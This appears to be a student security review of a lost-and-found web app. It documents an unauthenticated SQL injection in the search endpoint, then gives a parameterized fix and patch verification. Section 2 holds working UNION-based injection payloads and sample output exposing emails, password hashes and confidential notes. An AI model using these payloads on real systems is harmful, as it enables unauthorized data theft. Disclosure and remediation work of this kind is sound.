# BlueTag security review

Every claim below (query construction, PoC, and fix) has been verified against
a live local instance (`npm start`, Node v24.19.0, freshly seeded
`data/bluetag.db`) on 2026-09-02. Replace the `[hosted URL]` / commit-hash
placeholders in §5 once you deploy the patched app for submission.

## 1. Architecture sketch

```
Browser
  │  GET/POST over HTTP
  ▼
src/index.js
  ├─ express.urlencoded()          parses form bodies
  ├─ express-session                reads/writes the "connect.sid" cookie,
  │                                 hydrates req.session from server-side store
  ├─ attachUser (src/middleware/auth.js)
  │     res.locals.currentUser = req.session.user || null
  │     res.locals.flash       = req.session.flash || null
  ├─ authRoutes  (src/routes/auth.js)   /login /register /logout
  └─ itemRoutes  (src/routes/items.js)  /  /items/new  /items  /items/:id  /items/:id/resolve  /me
                                              │
                                              ▼
                                   src/db.js — node:sqlite DatabaseSync
                                   (single synchronous connection, WAL mode)
                                              │
                                              ▼
                                   data/bluetag.db (users, items, intake_log)
```

**Request → row.** There is no ORM or query builder. Each route handler calls
`db.prepare(sql).get|all|run(...)` directly and synchronously — the SQL text
lives inline in the route file, and `node:sqlite`'s `DatabaseSync` executes it
against `data/bluetag.db` in the same call. `INSERT`s go straight from
`req.body` fields (trimmed/validated) to bound `?` parameters, e.g.
`POST /items` → `src/routes/items.js:103-106`.

**Where authentication is enforced.** `express-session` (src/index.js:23-34)
is the only identity mechanism — a signed, `httpOnly`, `sameSite=lax` cookie
maps to `req.session.user = { id, email, displayName }`, set at
`src/routes/auth.js:33-37` (login) and `:88-92` (register). Two layers sit on
top of that:
- `attachUser` (global, `src/middleware/auth.js:9-14`) just exposes the
  session user to views; it does not gate anything.
- `requireAuth` (`src/middleware/auth.js:1-7`) is applied per-route —
  `GET /items/new`, `POST /items`, `POST /items/:id/resolve`, `GET /me`
  (`src/routes/items.js:74,82,130,145`). Everything else (`/`, `/items/:id`)
  is intentionally public.

  Authentication (who are you) is separate from authorization (what can you
  touch): `POST /items/:id/resolve` additionally checks
  `item.user_id === req.session.user.id` (`src/routes/items.js:132`) before
  allowing the update, so a signed-in user can't close someone else's post
  just by knowing its id. The `isOwner` flag on the item page
  (`src/routes/items.js:126`) only toggles whether the "Mark resolved" button
  is *rendered* — the real gate is the ownership check on the POST route, which
  is the one that matters.

**Search, filters, item pages.** `GET /` (`src/routes/items.js:50-72`) reads
`q`, `category`, `kind` from the query string and passes them to
`searchItems()`, which builds one SQL string joining `items` to `users` and
returns up to 50 rows ordered by `created_at`. `GET /items/:id`
(`src/routes/items.js:111-128`) runs a single parameterized `SELECT ... WHERE
items.id = ?` and 404s if the row is missing or `status = 'removed'`.

## 2. The defect: SQL injection in the public search endpoint

**Location:** `searchItems()`, `src/routes/items.js:15-48`.
**Class:** CWE-89 (SQL Injection), reachable by anyone, no login required.

```js
if (q) {
  sql += ` AND items.title || ' ' || items.description || ' ' || items.location LIKE '%${q}%'`;
}
if (category && category !== "all") {
  sql += ` AND items.category = '${category}'`;
}
if (kind && kind !== "all") {
  sql += ` AND items.kind = '${kind}'`;
}
```

All three request-controlled values (`req.query.q`, `req.query.category`,
`req.query.kind`) are dropped straight into the SQL text with template-literal
concatenation instead of the `?` placeholders used everywhere else in this
codebase (compare `src/routes/auth.js:24`, `src/routes/items.js:112-120`).
Every route that talks to the database elsewhere in the app parameterizes
correctly — this is the one place that doesn't, which is exactly what makes
it easy to miss in review.

Two independent things make this worse than a typical single-field miss:
- It's on `GET /`, the one endpoint with **zero** authentication or session
  requirement.
- `category` and `kind` aren't checked against the `CATEGORIES` allow-list or
  `('lost','found')` here (unlike the `POST /items` handler, which does
  validate them at `src/routes/items.js:83-86`) — so either of the three
  parameters is independently injectable, not just `q`.

### Why it's exploitable as UNION-based exfiltration, not just a syntax error

The seed data (`src/seed.js:38-43`) plants a fourth account,
`publicsafety@campus.edu`, with a `staff_notes` column holding a locker
release code and an after-hours drop location — data with no legitimate path
to the public board. That column, plus `password_hash` and `email` in
`users`, becomes reachable through the search box.

The base query selects exactly 11 columns (10 from `items`, plus
`users.display_name AS owner_name` from the join):

```
items.id, items.user_id, items.kind, items.category, items.title,
items.description, items.location, items.contact_pref, items.status,
items.created_at, users.display_name AS owner_name
```

SQLite has no strict column typing on ad hoc `SELECT`s, so a `UNION SELECT`
with 11 arbitrary-typed columns lines up fine. `--` then comments out the
rest of the built string (the closing `%'` and the trailing `ORDER BY ...
LIMIT 50`), since the whole thing is assembled as one line of text with no
embedded newline after the injection point.

**PoC — via the `q` parameter**, requesting the homepage with:

```
GET /?q=x%' UNION SELECT id, id, 'lost', 'other', email, password_hash, staff_notes, 'x', 'open', datetime('now'), display_name FROM users --
```

URL-encoded:

```
GET /?q=x%25%27%20UNION%20SELECT%20id%2C%20id%2C%20%27lost%27%2C%20%27other%27%2C%20email%2C%20password_hash%2C%20staff_notes%2C%20%27x%27%2C%20%27open%27%2C%20datetime(%27now%27)%2C%20display_name%20FROM%20users%20--
```

Resulting query (reconstructed from the source):

```sql
SELECT items.id, items.user_id, items.kind, items.category, items.title,
       items.description, items.location, items.contact_pref, items.status,
       items.created_at, users.display_name AS owner_name
FROM items JOIN users ON users.id = items.user_id
WHERE items.status != 'removed'
  AND items.title || ' ' || items.description || ' ' || items.location LIKE '%x%'
  UNION SELECT id, id, 'lost', 'other', email, password_hash, staff_notes, 'x', 'open', datetime('now'), display_name
  FROM users --%'
ORDER BY items.created_at DESC LIMIT 50
```

Rendered on the public board (`src/views/home.ejs`), each `users` row shows
up as a fake "item" card whose **title is the victim's email** and whose
**description is their bcrypt password hash**, with `staff_notes` sitting in
the location field for the public-safety row.

**Verified against a live instance** (`npm start`, freshly seeded database,
2026-09-02) — the request above, sent unauthenticated to `GET /`, returned
HTTP 200 and rendered all four seeded accounts as item cards, including:

```
<h2>publicsafety@campus.edu</h2>
<p>$2a$10$WO6y4c2K/yfSJQdn05ZptO/TbL//XKxVpQ.15GRcZV2RKKNY14L16</p>
...
<span>Do not publish. High-value locker A-14 release code is BLUE-4419. After-hours drop is the west vestibule of Hullihen Hall.</span>
```

along with `alex@campus.edu`, `jordan@campus.edu`, and `sam@campus.edu` each
paired with their bcrypt hash — a full, unauthenticated dump of the `users`
table via the search box.

**PoC — via the `category` parameter** (shows the flaw isn't a `q`-specific
escaping slip, since this path never touches the `LIKE` string at all; same
11-column requirement applies):

```
GET /?category=x' UNION SELECT id, id, 'lost', 'other', email, password_hash, staff_notes, 'x', 'open', created_at, display_name FROM users --
```

Also verified live (2026-09-02): HTTP 200, same four accounts and the same
`staff_notes` disclosure as the `q` PoC above.

**Impact:** unauthenticated, complete read access to the `users` table —
every registered email, every bcrypt hash (crackable offline, and likely
reused elsewhere by students), and the confidential `staff_notes` field,
including the locker code and drop-site details that were explicitly marked
"do not publish." A determined attacker could extend the same technique to
`sqlite_master` to enumerate the full schema, or to `intake_log` to read
notes about "removed" items that are otherwise hidden from the public board.

## 3. Fix

Replace string interpolation with bound parameters — the same pattern
already used correctly everywhere else in the codebase — and add a real
allow-list check on `category`/`kind` for the public search path too:

```js
function searchItems({ q, category, kind }) {
  let sql = `
    SELECT
      items.id, items.user_id, items.kind, items.category, items.title,
      items.description, items.location, items.contact_pref, items.status,
      items.created_at, users.display_name AS owner_name
    FROM items
    JOIN users ON users.id = items.user_id
    WHERE items.status != 'removed'
  `;
  const params = [];

  if (q) {
    sql += ` AND items.title || ' ' || items.description || ' ' || items.location LIKE ? ESCAPE '\\'`;
    params.push(`%${q.replace(/[\\%_]/g, (c) => `\\${c}`)}%`);
  }

  const validCategory = CATEGORIES.some((c) => c.slug === category);
  if (category && category !== "all" && validCategory) {
    sql += ` AND items.category = ?`;
    params.push(category);
  }

  if (kind === "lost" || kind === "found") {
    sql += ` AND items.kind = ?`;
    params.push(kind);
  }

  sql += " ORDER BY items.created_at DESC LIMIT 50";
  return db.prepare(sql).all(...params);
}
```

This closes all three injection points at once (`q`, `category`, `kind`)
because none of them are ever concatenated into the SQL text anymore — the
driver binds them as data. The `ESCAPE '\\'` clause is a correctness bonus:
it makes a literal `%` or `_` typed into the search box match literally
instead of acting as a SQL wildcard, which is the behavior a user searching
for, say, "100% cotton" would actually expect.

**Why normal use still works:** searching, kind filtering, and category
filtering all produce the exact same rendered SQL shape as before for
legitimate inputs (`?` binds to the same string that used to be interpolated
literally) — only the injection payloads stop being interpreted as SQL. An
unrecognized `category`/`kind` value now falls back to "no filter" instead of
either silently matching nothing or (previously) executing as SQL, which is
a strict improvement over the current behavior for malformed input.

## 4. Patch verification (2026-09-02, local instance)

- [x] Applied the patch above to `src/routes/items.js`.
- [x] Re-ran both PoC requests (`q` and `category` variants) against the
      patched, restarted app: both return HTTP 200 with **no** `users` data
      in the response — the payload is treated as a literal, unmatched search
      string ("Nothing matches that search"), not executed as SQL.
- [x] Confirmed normal use still works on the patched app:
      `q=earbuds` finds the matching item; `kind=found` returns all 4 found
      items; `category=keys` finds the matching item; a combined
      `q=lab&kind=lost&category=ids` query correctly narrows to one post.
- [x] Confirmed the `ESCAPE` fix improves correctness: `q=100%` (a literal
      percent sign) now returns 0 results instead of matching every row, since
      `%` is no longer interpreted as a SQL wildcard when typed by a user.
- [x] Hosted the patched app on Fly.io (Dockerfile-based deploy, persistent
      volume mounted at `/app/data` so `bluetag.db` survives redeploys, real
      random `SESSION_SECRET` set via `flyctl secrets set`).
- [x] Re-ran both PoC requests against the **hosted** URL and confirmed the
      same result as the local patch verification: HTTP 200, no `users` data
      in the response, "Nothing matches that search" rendered instead.
- [x] Re-confirmed normal search (`q=earbuds`) and the `/login` page both work
      on the hosted instance.

## 5. Submission fields

- **Hosted URL:** `https://bluetag-ryanhenderson.fly.dev/`
- **Date/time PoC was verified against the hosted instance:** 2026-09-02
      (UTC ~16:5x), immediately after deploy
- **Commit hash of the patch:** `c6b62e5` (repo: https://github.com/ryanhson/bluetag)
